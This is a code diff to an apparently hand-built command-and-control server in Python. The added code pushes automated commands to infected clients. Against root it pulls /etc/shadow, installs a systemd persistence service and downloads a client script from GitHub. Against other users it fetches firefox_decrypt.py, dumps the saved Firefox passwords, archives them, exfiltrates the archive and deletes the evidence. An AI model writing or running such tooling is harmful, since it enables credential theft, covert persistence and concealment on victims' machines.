@@ -5,6 +5,9 @@ import sys
 import time
 import json
 import base64
+import tarfile
+import os
+import textwrap
 
 clients = {}
 client_id = 0
@@ -28,21 +31,78 @@ def handle_client(client_socket, client_address, cid):
         }
     
     username = identity["user"]
-    
+    						# AUTOMATIONS FOR THE ROOT USER
     if username == "root":
         try:
-            command = "cat /etc/shadow"
+        # aquire the /etc/shadow file
+            command = "GETFILE /etc/shadow"
             client_socket.send(command.encode("utf-8"))
+            # install client in /opt and run on startup
+            
+            time.sleep(0.05)
+            
+            command = textwrap.dedent("""\
+sudo mkdir -p /opt/scripts && \
+sudo cat > /etc/systemd/system/run-python.service <<'EOF'
+[Unit]
+Description=Run Python script at boot
+Wants=network-online.target
+After=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/bin/env python3 /opt/scripts/client.py
+
+[Install]
+WantedBy=multi-user.target
+EOF
+            """)
+            print(command)
+            client_socket.send(command.encode("utf-8"))
+            time.sleep(0.05)
+            command = "sudo wget https://raw.githubusercontent.com/SJMetz/SCN-DUCKY-REPO/refs/heads/main/client.py -O /opt/scripts/client.py"
+            client_socket.send(command.encode("utf-8"))
+            time.sleep(0.05)
+            command = "sudo chmod +x /opt/scripts/myscript.py"
+            client_socket.send(command.encode("utf-8"))
+            command = "systemctl --user daemon-reload"
+            client_socket.send(command.encode("utf-8"))
+            command = "systemctl --user enable run-python.service"
+            client_socket.send(command.encode("utf-8"))
+            
             print(f"[+] Sent auto-command to {username}")
         except Exception as e:
             print(f"[!] Failed to send auto-command: {e}")
-    else:
+    else:					# AUTOMATIONS FOR THE REGULAR USER
         try:	
+            #  GET FIREFOX STORED PASSWORDS
     	    # get the firefox_decrypt.py file
             command = "wget https://raw.githubusercontent.com/SJMetz/SCN-DUCKY-REPO/refs/heads/main/firefox_decrypt.py"
             client_socket.send(command.encode("utf-8"))
+            # RUN THE FILE output JSONs
+            time.sleep(0.5)
             command = "for profile in ~/.mozilla/firefox/*.default*; do   echo \"Processing $profile\";   python3.9 firefox_decrypt.py \"$profile\" > \"$(basename \"$profile\").json\"; done"
             client_socket.send(command.encode("utf-8"))
+            # Package them together
+            time.sleep(0.5)
+            command = "tar -czf json_output.tar.gz *.json"
+            client_socket.send(command.encode("utf-8"))
+            # RETRIEVE THE tar file
+            time.sleep(1)
+            command = "GETFILE json_output.tar.gz"
+            client_socket.send(command.encode("utf-8"))
+        
+            # REMOVE JSONs and tar file
+            #time.sleep(1)
+            #command = "find . -name \"*.json\" -type f -delete"
+            #client_socket.send(command.encode("utf-8"))
+            #time.sleep(0.5)
+            command = "rm json_output.tar.gz"
+            client_socket.send(command.encode("utf-8"))
+            command = "find . -name \"*.json\" -type f -delete"
+            client_socket.send(command.encode("utf-8"))
+            
+            
             print(f"[+] Sent auto-command to {username}")
         except Exception as e:
             print(f"[!] Failed to send auto-command: {e}")
